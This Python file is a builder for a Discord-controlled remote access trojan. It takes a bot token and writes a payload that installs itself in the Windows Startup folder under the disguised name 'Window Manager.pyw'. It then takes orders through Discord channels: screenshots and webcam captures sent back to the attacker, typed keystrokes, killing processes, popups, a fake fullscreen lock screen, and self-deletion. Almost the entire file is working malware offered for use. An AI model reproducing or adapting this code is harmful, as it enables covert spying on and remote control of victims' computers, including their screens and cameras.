import tkinter as tk
from tkinter import filedialog
import os
import shutil
import discord
from threading import Thread
import pyautogui
import time
import platform
import psutil
import cv2
from PIL import ImageGrab
import win32gui
import win32process

def compile_script():
    bot_token = entry.get()
    if not bot_token:
        result_label.config(text="Please enter a bot token.", fg="red")
        return

    script = f'''import discord
import os
import shutil
import tkinter as tk
from threading import Thread
import pyautogui
import time
import platform
import psutil
import cv2
from PIL import ImageGrab
import win32gui
import win32process

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True

client = discord.Client(intents=intents)

pc_name = os.getenv('COMPUTERNAME')
if not pc_name:
    pc_name = "UnknownPC"

category_name = f"--- {{pc_name}} ---"

black_window = None

def create_black_window():
    global black_window
    black_window = tk.Tk()
    black_window.title("Monitor Off")

    screen_width = black_window.winfo_screenwidth()
    screen_height = black_window.winfo_screenheight()
    black_window.geometry(f"{{screen_width}}x{{screen_height}}+0+0")
    black_window.attributes('-topmost', True)
    black_window.attributes('-fullscreen', True)
    black_window.attributes('-toolwindow', True)

    canvas = tk.Canvas(black_window, width=screen_width, height=screen_height, bd=0, highlightthickness=0, bg='#000000')
    canvas.pack(fill=tk.BOTH, expand=True)

    canvas.create_text(
        screen_width / 2,
        screen_height / 4,
        text="... ", 
        font=("Arial", 80), 
        fill="white",
        anchor="n",
        width=screen_width
    )
    
    canvas.create_text(
        screen_width / 2,
        screen_height / 6 + 100,
        text="Re Calculating PC, Please wait.", 
        font=("Arial", 15), 
        fill="white",
        anchor="n",
        width=screen_width - 40
    )

    black_window.protocol("WM_DELETE_WINDOW", on_window_close)
    black_window.mainloop()

def on_window_close():
    global black_window
    if black_window:
        black_window.withdraw()

def show_black_window():
    global black_window
    if black_window is None or not black_window.winfo_exists():
        Thread(target=create_black_window).start()
    else:
        black_window.deiconify()

def close_black_window():
    global black_window
    if black_window and black_window.winfo_exists():
        black_window.withdraw()

Photon = '{bot_token}'

@client.event
async def on_ready():
    await create_category_and_channels()

async def create_category_and_channels():
    guild = discord.utils.get(client.guilds)
    if not guild:
        print("No guild found.")
        return

    category = discord.utils.get(guild.categories, name=category_name)
    
    if not category:
        category = await guild.create_category(category_name)
    
    existing_channels = {{channel.name for channel in guild.channels}}
    channel_names = ['screenshots', 'webcam', 'implode', 'bsod', 'type', 'apps', 'clode']
    for channel_name in channel_names:
        if channel_name not in existing_channels:
            await guild.create_text_channel(channel_name, category=category)

async def get_visible_apps():
    def enum_windows_callback(hwnd, windows):
        if win32gui.IsWindowVisible(hwnd):
            windows.append(hwnd)
    
    windows = []
    win32gui.EnumWindows(enum_windows_callback, windows)
    
    apps = []
    for hwnd in windows:
        try:
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            proc = psutil.Process(pid)
            exe_name = proc.exe()
            if exe_name:
                apps.append(os.path.basename(exe_name))
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return apps

def create_popup(message):
    popup = tk.Tk()
    popup.title("Popup")
    
    label = tk.Label(popup, text=message, padx=20, pady=20)
    label.pack()
    
    popup.attributes('-topmost', True)
    popup.after(5000, popup.destroy)  # Auto-close after 5 seconds
    popup.mainloop()

def show_popup(message):
    Thread(target=create_popup, args=(message,)).start()

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.channel.category and message.channel.category.name == category_name:
        if message.content == '.ss':
            try:
                screenshot = ImageGrab.grab()
                screenshot_path = os.path.expanduser('~/screenshot.png')
                screenshot.save(screenshot_path)
                with open(screenshot_path, 'rb') as f:
                    screenshot_file = discord.File(f)
                    await message.channel.send('Screenshot taken and saved:', file=screenshot_file)
                os.remove(screenshot_path)
            except Exception as e:
                await message.channel.send(f'Error: {{e}}')
        elif message.content == '.webcam':
            try:
                cap = cv2.VideoCapture(0)
                if not cap.isOpened():
                    await message.channel.send('Error: Could not open webcam.')
                    return
                ret, frame = cap.read()
                if ret:
                    webcam_path = os.path.expanduser('~/webcam_image.png')
                    cv2.imwrite(webcam_path, frame)
                    cap.release()
                    with open(webcam_path, 'rb') as f:
                        webcam_file = discord.File(f)
                        await message.channel.send('Webcam image taken and saved:', file=webcam_file)
                    os.remove(webcam_path)
                else:
                    await message.channel.send('Error: Failed to capture image from webcam.')
            except Exception as e:
                await message.channel.send(f'Error: {{e}}')
        elif message.content == '.bsod':
            show_black_window()
            await message.channel.send('Bsod.')
        elif message.content == '.bsodn':
            close_black_window()
            await message.channel.send('No bsod.')
        elif message.content == '.implode':
            try:
                startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'Window Manager.pyw')
                if os.path.exists(startup_path):
                    os.remove(startup_path)
                script_path = os.path.abspath(__file__)
                if os.path.exists(script_path):
                    os.remove(script_path)
                await message.channel.send('Imploded. The bot will now close.')
                await client.close()
            except Exception as e:
                await message.channel.send(f'Error: {{e}}')
        elif message.content.startswith('.type '):
            text_to_type = message.content[6:]
            if text_to_type:
                pyautogui.write(text_to_type, interval=0.1)
                pyautogui.press('enter')
                await message.channel.send(f'Typed: {{text_to_type}}')
            else:
                await message.channel.send('Error: No text provided to type.')
        elif message.content == '.apps':
            try:
                apps = await get_visible_apps()
                if apps:
                    app_list = '\\n'.join(apps)
                    if len(app_list) > 2000:
                        app_list = app_list[:2000] + "\\n...and more."
                    await message.channel.send(f"Visible Apps:\\n{{app_list}}")
                else:
                    await message.channel.send("No visible apps found.")
            except Exception as e:
                await message.channel.send(f'Error: {{e}}')
        elif message.content.startswith('.close '):
            exe_name = message.content[7:].strip()
            if exe_name:
                found = False
                for proc in psutil.process_iter(['name']):
                    try:
                        if proc.info['name'].lower() == exe_name.lower():
                            proc.terminate()
                            await message.channel.send(f"{{exe_name}} has been closed.")
                            found = True
                            break
                    except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                        await message.channel.send(f'Error: {{e}}')
                if not found:
                    await message.channel.send(f"No process found with name: {{exe_name}}")
            else:
                await message.channel.send("Please specify the name of the executable to close.")
        elif message.content.startswith('.popup '):
            popup_message = message.content[7:].strip()
            if popup_message:
                show_popup(popup_message)
                await message.channel.send(f'Popup created with message: {{popup_message}}')
            else:
                await message.channel.send("Error: No message provided for popup.")
    else:
        await message.channel.send('Commands can only be used in the designated channels.')

def add_to_startup():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    script_name = 'Window Manager.pyw'
    script_path = os.path.abspath(__file__)
    destination = os.path.join(startup_folder, script_name)
    if not os.path.exists(destination):
        shutil.copyfile(script_path, destination)

add_to_startup()

client.run(Photon)'''

    # Save the script in the same directory as the original script
    original_script_path = os.path.abspath(__file__)
    directory = os.path.dirname(original_script_path)
    save_path = os.path.join(directory, 'compiled_script.pyw')

    with open(save_path, 'w') as file:
        file.write(script)

    result_label.config(text=f"File compiled and saved successfully at: {save_path}", fg="green")

root = tk.Tk()
root.title("Script Compiler")

# Apply a modern theme
root.configure(bg="#2e2e2e")

# Entry widget
entry = tk.Entry(root, width=50, font=("Arial", 12), bd=2, relief=tk.GROOVE)
entry.pack(pady=10)

# Compile button
compile_button = tk.Button(root, text="Compile Script", command=compile_script, font=("Arial", 12), bg="#4caf50", fg="white", bd=0, padx=10, pady=5)
compile_button.pack(pady=10)

# Result label
result_label = tk.Label(root, text="", font=("Arial", 12), bg="#2e2e2e", fg="white")
result_label.pack(pady=10)

root.mainloop()
